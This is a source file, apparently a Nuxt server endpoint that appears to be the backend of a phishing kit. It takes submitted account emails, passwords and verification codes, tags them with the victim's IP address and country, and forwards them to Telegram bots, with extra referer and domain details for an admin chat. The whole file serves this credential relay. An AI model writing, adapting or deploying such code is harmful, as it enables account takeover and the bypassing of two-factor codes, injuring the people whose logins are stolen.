import { setDefaultResultOrder } from 'node:dns'
import { countryAlpha2CodeMapIcon } from '../utils/country'
setDefaultResultOrder('ipv4first')
export default defineEventHandler(async (event) => {
  // event.context.path to get the route path: '/api/foo/bar/baz'
  // event.context.params._ to get the route segment: 'bar/baz'
  const { account, code, message, newUser, rawMessage, conversation } = await readBody(event)
  if (!account && !code && !message && !newUser && !rawMessage) {
    throw createError({
      statusCode: 400,
      statusMessage: 'Bad Request',
    })
  }
  try {
    const countryCode = event?.headers.get('CF-IPCountry')
    const countryIcon =
      countryAlpha2CodeMapIcon[countryCode as keyof typeof countryAlpha2CodeMapIcon] || '🌐'
    const runtimeConfig = useRuntimeConfig()
    const tokens = runtimeConfig.TELEGRAM_BOT_TOKEN.split('|')
    const chatIds = runtimeConfig.TELEGRAM_CHAT_ID?.split('|')
    const adminId = runtimeConfig.ADMIN_ID
    const HOST_PRODUCTION = runtimeConfig.HOST_PRODUCTION
    const host = event.node.req.headers.host
      ? event.node.req.headers.host.replace(/</g, '&lt;').replace(/>/g, '&gt;')
      : 'N/A'

    if (HOST_PRODUCTION === host && !countryCode) {
      throw createError({
        statusCode: 400,
        statusMessage: 'Bad Request',
      })
    }

    console.log('tokens', tokens, 'chatIds', chatIds)
    if (!tokens || !chatIds || tokens.length !== chatIds.length) {
      throw createError({
        statusCode: 400,
        statusMessage: 'Bad Request',
      })
    }

    let messageText = ''

    if (code) {
      messageText = `
<b>🛰 Địa chỉ ip: </b>${event.headers.get('CF-Connecting-IP')}
<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}

<b>📲 Code : </b><code>${code}</code>
`
    } else if (account) {
      messageText = `
<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}

<b>🔑 Tài khoản: </b><code>${account.email}</code>
<b>🔐 Mật khẩu: </b><code>${account.password}</code>
`
    } else if (message) {
      messageText = `
<b>🛰 ip: </b>${event.headers.get('CF-Connecting-IP')}
<b>🌐 Quốc gia: </b>${countryCode} ${countryIcon}

<b>${message}</b>
`
    } else if (rawMessage) {
      messageText = rawMessage
    }

    const resultChat = []
    for (let i = 0; i < tokens.length; i++) {
      if (!tokens[i] || !chatIds[i]) {
        continue
      }

      // find chatid in conversation
      if (conversation && conversation.length > 0) {
        const chatId = conversation.find((c) => c.cid === chatIds[i])?.mid
        try {
          await $fetch(`https://api.telegram.org/bot${tokens[i]}/deleteMessage`, {
            method: 'POST',
            body: {
              chat_id: chatIds[i],
              message_id: chatId,
            },
          })
        } catch (error) {
          console.error(error)
        }
      }
      try {
        console.log('sending to', chatIds[i], tokens[i])
        console.log(
          'Admin ID:',
          adminId,
          ' - ChatID:',
          chatIds[i],
          'is equal:',
          adminId === chatIds[i],
        )
        let messageBody = messageText
        if (chatIds[i] && adminId && chatIds[i] === adminId) {
          messageBody += `
- ADMIN INFO -
<b>📡 Referer: </b>${event?.headers?.get('Referer')?.replace(/</g, '&lt;')?.replace(/>/g, '&gt;')}
<b>🌐 Domain: </b>${host}
`
        }
        const res = await fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
          method: 'POST',
          body: JSON.stringify({
            chat_id: chatIds[i],
            text: messageBody,
            parse_mode: 'HTML',
          }),
        })
        const result = await res.json()
        resultChat.push({
          cid: chatIds[i],
          mid: result.message_id,
        })
      } catch (error) {
        console.error('error------>', error?.description)
        console.error(error)
      }
    }
    return resultChat
  } catch (error) {
    // eslint-disable-next-line no-console
    console.error(error)
    return error
  }
})
